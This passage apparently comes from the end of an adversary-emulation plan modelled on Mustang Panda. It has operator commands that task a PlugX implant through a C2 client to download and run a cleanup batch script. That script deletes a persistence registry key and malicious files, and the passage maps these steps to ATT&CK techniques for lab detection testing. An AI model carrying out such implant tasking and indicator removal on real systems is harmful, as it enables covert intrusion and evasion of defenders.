- ☣️ Task Plug X to download the cleanup batch script `del_WinGupSvc.bat`

  ```bash
  python3 /opt/kalidev/mustang_panda/Resources/controlServer/evalsC2client.py --set-task 123 '{"id": "0x1003", "args": "%TEMP%\\del_WinGupSvc.bat", "file": "del_WinGupSvc.bat"}'
  ```

  - ***Expected Output***

    ```text
    File saved successfully.
    ```

- ☣️ Task Plug X to execute the cleanup batch script `del_WinGupSvc.bat`. Plug X
should stop checking in after the cleanup script is run. Wait at least 1 full
minute to ensure Plug X does not continue to check in.

  ```bash
  python3 /opt/kalidev/mustang_panda/Resources/controlServer/evalsC2client.py --set-task 123 '{"id": "0x1000", "args": "cmd.exe /c %TEMP%\\del_WinGupSvc.bat"}'
  ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports
|  - | - | - | - | - | - | - | - | - | - | -
| Command and Control | T1105 | Ingress Tool Transfer | Windows | gup.exe downloaded cleanup batch script to `%TEMP%\del_WinGupSvc.bat` | Not Calibrated - Not Benign | Plug X downloads cleanup batch script to `%TEMP%\del_WinGupSvc.bat` | stepstones (10.55.4.104) | ccole | [HandleC2DownloadFile](../Resources/plugx/src/shellcode/modules/C2DownloadFile/C2DownloadFile.cpp#L36-L108) | [3], [17]
| Execution | T1059.003 | Command and Scripting Interpreter: Windows Command Shell | Windows | gup.exe executed the cleanup batch script `%TEMP%\del_WinGupSvc.bat` | Not Calibrated - Not Benign | Plug X executes the cleanup batch script `%TEMP%\del_WinGupSvc.bat` | stepstones (10.55.4.104) | ccole | [HandleExecuteCommand](../Resources/plugx/src/shellcode/modules/ExecuteCommand/ExecuteCommand.cpp#L72-L170) | [3], [17]
| Defense Evasion | T1070.009 | Indicator Removal: Clear Persistence | Windows | `%TEMP%\del_WinGupSvc.bat` deletes the created registry key WinGupSvc | Not Calibrated - Not Benign | The cleanup batch script `%TEMP%\del_WinGupSvc.bat` deletes the created registry key | stepstones (10.55.4.104) | ccole | [Delete registry key](../Resources/payloads/del_WinGupSvc.bat#L20-L23) | [3], [17]
| Defense Evasion | T1070.004 | Indicator Removal: File Deletion | Windows | `%TEMP%\del_WinGupSvc.bat` deletes downloaded malicious files and itself | Not Calibrated - Not Benign | The cleanup batch script `%TEMP%\del_WinGupSvc.bat` deletes downloaded malicious files and itself | stepstones (10.55.4.104) | ccole | [Delete malicious files](../Resources/payloads/del_WinGupSvc.bat#L10-L18), [Delete self](../Resources/payloads/del_WinGupSvc.bat#L25-L26) | [3], [17]

## End of Scenario

### Voice Track

The following procedures will terminate the C2 server and sign out
of any remaining RDP sessions.

### Procedures

- From Kali, navigate to the terminal running the C2 server and terminate it via
'ctrl+c'.

- Close all remaining terminal tabs via the 'exit' command.

- On Kali, if Firefox is open, close any open tabs including tabs for
<https://vscode.dev/tunnel/redkeep> and <https://vscode.dev/tunnel/harrenhal>.

- Switch back to the RDP session to `jumpbox`. Sign out of your RDP session to the
domain controller `redkeep (10.55.3.100)`. Exit any open terminals and close any
open tabs on the jumpbox.
